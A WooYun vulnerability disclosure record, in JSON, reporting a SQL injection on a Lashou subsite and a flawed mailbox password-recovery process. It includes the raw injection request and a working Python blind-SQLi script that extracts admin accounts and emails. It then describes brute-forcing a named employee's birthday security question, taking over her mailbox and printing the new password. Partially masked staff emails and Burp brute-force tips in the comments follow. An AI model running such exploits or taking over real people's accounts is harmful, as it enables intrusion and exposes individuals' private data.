{"id": 31192, "wybug_id": "wooyun-2015-0118538", "wybug_title": "拉手网分站sql注入+邮箱设计缺陷", "wybug_corp": "拉手网", "wybug_author": "loopx9", "wybug_date": "2015-06-06 09:28", "wybug_open_date": "2015-06-11 11:07", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-11：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 注入。 详细说明：  url地址: http://niu.lashou.com/index.php 标题是拉手网后台不知是不是。\nPOST http://niu.lashou.com/public/Public/out_password_set HTTP/1.1Host: niu.lashou.comProxy-Connection: keep-aliveContent-Length: 48Accept: */*Origin: http://niu.lashou.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: loginType=1&account[0]=exp&account[1]==-1 or 1=1\n还是thinkphp框架注入，感觉使用thinkphp开发，一个不小心就容易被坑。\n\n\n\n本想通过注入获得动态密码尝试登录进去看看，但注入出来的动态密码好像是部分hash，没法利用。注入测试脚本:\n#coding=utf-8import sys,urllib2import threadingfrom multiprocessing.dummy import Poolfrom multiprocessing.dummy import Lockfrom optparse import OptionParserfrom urllib2 import Request,urlopen,URLError,HTTPErrorimport urllibdef request(URL, data):    user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' }    req = urllib2.Request(URL, None, user_agent)            try:        request = urllib2.urlopen(req, data)          except:        return ''      return request.read()def binary_sqli(left, right, index):   global result   while 1:        mid = (left + right)/2        if mid == left:            lock.acquire()            result[index-1]= chr(mid)            sys.stdout.write('\\r%s' % 'tables: '+''.join(result).strip('*'))            sys.stdout.flush()            lock.release()            break        payload = \"=-1 or 1=if(ascii(substring((select group_concat(account,0x3a,email) from houtai_user where status=1),%s,1))<%s,1,2)\" % (index, mid)        param = {'loginType': '1', 'account[0]':'exp', 'account[1]': payload}        html = request('http://niu.lashou.com/public/Public/out_password_set', urllib.urlencode(param))         verify = '超级管理员账号不允许获取动态密码'        if verify in html:            right = mid        else:            left = middef multi_run_wrapper(args):    return binary_sqli(*args)                   if __name__ == '__main__':    result=list('*'*500)    lock=Lock()    args = []    for i in range(1,500):        args.append((32, 127, i))    pool = Pool(10)    out = pool.map(multi_run_wrapper, args)    pool.close()     pool.join()\n动态密码是发送到拉手网邮箱的，于是转向邮箱，尝试破解一个邮箱账号。利用注入得到一些邮箱列表，在http://mail.lashou-inc.com 上尝试密码找回。发现密码找回方式为密保问题，而且没有错误限制次数，可以暴力破解。找到个妹子的邮箱，密保问题为生日。\n\n于是操起burp跑起。\n\n原来是个80年的姐姐。\n\n000000. 密码强度不够，设置一个复杂点的密码: wangyuan!@#$%^0000登录邮箱后得到动态密码:\n\n却还是登录不了后台，囧。。。可能还限制访问ip..   漏洞证明：  部分工号,email：\nadmin:lip******@lashou-inc.com10*****8:lij******@lashou-inc.com10*****4:tangwe******@lashou-inc.com10*****6:zhangwen******@lashou-inc.com10*****4:wan******@lashou-inc.com10*****9:wangju******@lashou-inc.com10*****6:zhangxia******@lashou-inc.com10*****6:lvx******@lashou-inc.com10*****7:che******@lashou-inc.com10*****4:yuji******@lashou-inc.com10*****7:lish******@lashou-inc.com10*****7:liangs******@lashou-inc.com10*****5:he******@lashou-inc.com10*****1:lif******@lashou-inc.com10*****4:******@lashou-inc.com\nwangyuan@lashou-inc.com 密码改成了: wangyuan!@#$%^0000   修复方案：  修复注入；限制访问后台；邮箱密码找回限制错误次数；waf;   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-06-08 10:47 厂商回复： 问题已经告知研发,正在处理.谢谢您的关注,对于您写的漏洞报告,确实内容详实,希望您保持.万谢. 最新状态： 2015-06-11：漏洞修复完成.谢谢  ", "replys": "漏洞评价：\n评论\n     2015-06-11 17:07 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  很有耐心，一般我遇到那种密码问题保护的基本都放弃了。    \n     2015-06-11 17:52 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  洞主，请问burp爆破，那个年月日如何拼接成answer的啊，还能同步的?    \n     2015-06-12 13:24 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  @胡小树 brup payload类型选择date，然后自定义格式:'year='yyyy'&month='MM'&day='dd'&answer='yyyyMMdd 同时记得取消payload的url编码。    \n     2015-06-12 15:18 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  @loopx9  厉害，我去，从来没注意过这些。学习了    \n     2015-06-12 20:51 |    \t\t我可是学霸的男人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 学霸的男人就是我)\t\t \n  高手求教burp    \n     2015-06-23 09:31 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  继续向一哥学习    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}